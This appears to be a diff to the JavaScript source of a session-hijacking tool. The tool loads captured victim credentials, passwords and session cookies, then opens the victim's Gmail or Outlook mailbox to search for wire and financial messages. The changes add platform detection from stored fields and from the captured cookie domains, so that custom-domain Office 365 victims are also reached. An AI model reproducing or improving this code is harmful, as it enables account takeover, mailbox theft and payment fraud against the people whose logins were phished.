@@ -62,7 +62,16 @@ export async function resolveSession(browserId) {
 
     const email = col('email') || '';
     const domain = col('domain') || (email ? email.split('@')[1]?.toLowerCase() : '') || '';
-    const platform = detectEmailPlatform(domain);
+    // Prefer the platform stored by the login flow (written at capture time from
+    // MX matching — e.g. custom-domain Office accounts get 'outlook'). Domain
+    // detection alone returns 'other' for custom domains, which used to make
+    // extractWire fall back to gmail and navigate mail.google.com instead of the
+    // account's real mailbox.
+    const storedPlatform = String(col('platform') || '').toLowerCase().trim();
+    const platform = (storedPlatform === 'gmail' || storedPlatform === 'outlook')
+        ? storedPlatform
+        : detectEmailPlatform(domain);
+    const platformSource = (storedPlatform === 'gmail' || storedPlatform === 'outlook') ? 'stored' : 'domain';
     const cookieJSON = col('cookieJSON') || col('cookie') || col('formattedCookie') || '';
     const password = col('password') || '';
     const driveUrl = col('driveUrl') || col('cookieFileURL') || '';
@@ -91,6 +100,8 @@ export async function resolveSession(browserId) {
         email,
         domain,
         platform,
+        platformSource,
+        storedPlatform,
         password,
         socialPlatform,
         bankPlatform,
@@ -104,8 +115,35 @@ export async function resolveSession(browserId) {
 export function detectEmailPlatform(domain) {
     const d = String(domain).toLowerCase();
     if (d.includes('gmail') || d.includes('googlemail')) return 'gmail';
-    if (d.includes('outlook') || d.includes('hotmail') || d.includes('live.com') || d.includes('msn') || d.includes('microsoftonline')) return 'outlook';
+    // Microsoft consumer + business domains. 'microsoft' covers microsoftonline.com
+    // and *.onmicrosoft.com (tenant) domains; office.com/office365.com cover M365.
+    if (
+        d.includes('outlook') || d.includes('hotmail') || d.includes('live.com') ||
+        d.includes('msn') || d.includes('microsoft') || d.includes('windowslive') ||
+        d.includes('office365') || d === 'office.com' || d.endsWith('.office.com')
+    ) return 'outlook';
     return 'other';
+}
+
+// Infer mailbox platform from the captured cookie domains — works for any custom
+// domain whose stored platform is missing/unknown (e.g. legacy rows).
+// Returns 'gmail' | 'outlook' | null.
+function inferPlatformFromCookies(cookieJSON) {
+    try {
+        const cookies = typeof cookieJSON === 'string' ? JSON.parse(cookieJSON) : cookieJSON;
+        if (!Array.isArray(cookies)) return null;
+        const domains = cookies.map(c => String(c?.domain || '').toLowerCase());
+        const hasGoogle = domains.some(d => d === 'google.com' || d.endsWith('.google.com') || d.includes('gmail'));
+        const hasMicrosoft = domains.some(d =>
+            d.includes('outlook') || d.includes('office.com') || d.includes('office365') ||
+            d.includes('hotmail') || d.includes('live.com') || d.includes('microsoft.com')
+        );
+        if (hasMicrosoft && !hasGoogle) return 'outlook';
+        if (hasGoogle && !hasMicrosoft) return 'gmail';
+        return null;
+    } catch (_) {
+        return null;
+    }
 }
 
 // ==================== Generic DOM Helpers ====================
@@ -1233,7 +1271,25 @@ async function extractActivities(page, platform, email, financialTexts = [], lim
 
 async function extractWire(session, browserId) {
     const cookieJSON = session.cookieJSON;
-    const platform = session.platform === 'gmail' || session.platform === 'outlook' ? session.platform : 'gmail';
+    // Layered platform resolution — never silently coerce a custom-domain
+    // account to gmail (that navigated mail.google.com for Office accounts):
+    //   1. session.platform (stored cookie-sheet column, else domain detection)
+    //   2. cookie-domain inference (google.com vs outlook/office cookies)
+    //   3. gmail fallback with a warning log
+    let platform = session.platform;
+    let platformSource = session.platformSource || 'domain';
+    if (platform !== 'gmail' && platform !== 'outlook') {
+        const inferred = inferPlatformFromCookies(cookieJSON);
+        if (inferred) {
+            platform = inferred;
+            platformSource = 'cookies';
+        } else {
+            platform = 'gmail';
+            platformSource = 'default';
+            logger.warn(`[smartExtract] platform unresolved for domain='${session.domain}' (stored='${session.storedPlatform || 'none'}', detected='${session.platform}') — defaulting to gmail`);
+        }
+    }
+    logger.info(`[smartExtract] platform resolved: ${platform} (source=${platformSource}, domain=${session.domain || 'unknown'})`);
     const start = Date.now();
 
     // Financial search batches
